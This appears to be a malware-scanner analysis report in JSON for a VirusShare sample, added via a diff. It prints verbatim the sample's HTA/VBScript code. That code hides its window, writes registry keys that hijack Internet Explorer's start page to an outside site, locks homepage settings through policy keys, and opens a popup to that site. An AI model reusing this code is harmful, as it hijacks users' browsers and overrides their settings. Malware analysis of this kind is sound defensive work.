@@ -1,0 +1,83 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "open": "May open a file",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "<html><head>\n<hta:application id=hta_note_id\n applicationName=hta_note_name\n showInTaskBar=no\n caption=no\n innerBorder=no\n selection=no\n scroll=no\n contextmenu=no />\n<script language=javascript>\nwindow.resizeTo(0, 0);\nwindow.moveTo(0, 0);\n</script>\n<SCRIPT language=vbs>\nself.MoveTo 0, 0\nSet shell = CreateObject(\"WScript.Shell\")\n  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\URL\\Prefixes\\\\mirc\",\"http://www.odevsec.com/google.com.htm\",\"REG_SZ\"\n  shell.regwrite \"HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"\n  shell.regwrite \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"\n  shell.regwrite \"HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\Start Page\", \"http://www.odevsec.com/google.com.htm\",\"REG_SZ\"\n  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\Start Page\", \"http://www.odevsec.com/google.com.htm\",\"REG_SZ\"\nself.Close\n</SCRIPT>\n\n<script language=\"JavaScript\">\n<!--\nfunction FP_openNewWindow(w,h,nav,loc,sts,menu,scroll,resize,name,url) {//v1.0\n var windowProperties=''; if(nav==false) windowProperties+='toolbar=no,'; else\n  windowProperties+='toolbar=yes,'; if(loc==false) windowProperties+='location=no,'; \n else windowProperties+='location=yes,'; if(sts==false) windowProperties+='status=no,';\n else windowProperties+='status=yes,'; if(menu==false) windowProperties+='menubar=no,';\n else windowProperties+='menubar=yes,'; if(scroll==false) windowProperties+='scrollbars=no,';\n else windowProperties+='scrollbars=yes,'; if(resize==false) windowProperties+='resizable=no,';\n else windowProperties+='resizable=yes,'; if(w!=\"\") windowProperties+='width='+w+',';\n if(h!=\"\") windowProperties+='height='+h; if(windowProperties!=\"\") { \n  if( windowProperties.charAt(windowProperties.length-1)==',') \n   windowProperties=windowProperties.substring(0,windowProperties.length-1); } \n window.open(url,name,windowProperties);\n}\n// -->\n</script>\n</head>\n<body onbeforeunload=\"FP_openNewWindow('640', '480', false, false, false, false, true, false, 'Duyuru', /*href*/http://www.odevsec.com/google.com.htm')\">\n</body>\n</html>"
+    },
+    "filename": "VirusShare_0819271733b97508e0c5ccc4d424df2f",
+    "filesize": 2203,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0819271733b97508e0c5ccc4d424df2f",
+        "sha1": "1846ece67a0f7227d07bfc952a5a56c304ce618c",
+        "sha256": "80c28f18f381c1e8265b1498709dd0cbc6fd44f060134bf0d2b76e93b12796fa"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html><head>",
+            "<hta:application id=hta_note_id",
+            " applicationName=hta_note_name",
+            " showInTaskBar=no",
+            " caption=no",
+            " innerBorder=no",
+            " selection=no",
+            " scroll=no",
+            " contextmenu=no />",
+            "<script language=javascript>",
+            "window.resizeTo(0, 0);",
+            "window.moveTo(0, 0);",
+            "</script>",
+            "<SCRIPT language=vbs>",
+            "self.MoveTo 0, 0",
+            "Set shell = CreateObject(\"WScript.Shell\")",
+            "  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\URL\\Prefixes\\\\mirc\",\"http://www.odevsec.com/google.com.htm\",\"REG_SZ\"",
+            "  shell.regwrite \"HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"",
+            "  shell.regwrite \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"",
+            "  shell.regwrite \"HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\Start Page\", \"http://www.odevsec.com/google.com.htm\",\"REG_SZ\"",
+            "  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\Start Page\", \"http://www.odevsec.com/google.com.htm\",\"REG_SZ\"",
+            "self.Close",
+            "</SCRIPT>",
+            "<script language=\"JavaScript\">",
+            "<!--",
+            "function FP_openNewWindow(w,h,nav,loc,sts,menu,scroll,resize,name,url) {//v1.0",
+            " var windowProperties=''; if(nav==false) windowProperties+='toolbar=no,'; else",
+            "  windowProperties+='toolbar=yes,'; if(loc==false) windowProperties+='location=no,'; ",
+            " else windowProperties+='location=yes,'; if(sts==false) windowProperties+='status=no,';",
+            " else windowProperties+='status=yes,'; if(menu==false) windowProperties+='menubar=no,';",
+            " else windowProperties+='menubar=yes,'; if(scroll==false) windowProperties+='scrollbars=no,';",
+            " else windowProperties+='scrollbars=yes,'; if(resize==false) windowProperties+='resizable=no,';",
+            " else windowProperties+='resizable=yes,'; if(w!=\"\") windowProperties+='width='+w+',';",
+            " if(h!=\"\") windowProperties+='height='+h; if(windowProperties!=\"\") { ",
+            "  if( windowProperties.charAt(windowProperties.length-1)==',') ",
+            "   windowProperties=windowProperties.substring(0,windowProperties.length-1); } ",
+            " window.open(url,name,windowProperties);",
+            "// -->",
+            "</script>",
+            "</head>",
+            "<body onbeforeunload=\"FP_openNewWindow('640', '480', false, false, false, false, true, false, 'Duyuru', /*href*/http://www.odevsec.com/google.com.htm')\">",
+            "</body>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.odevsec.com/google.com.htm"
+        ]
+    },
+    "time": "0:00:00.285758",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
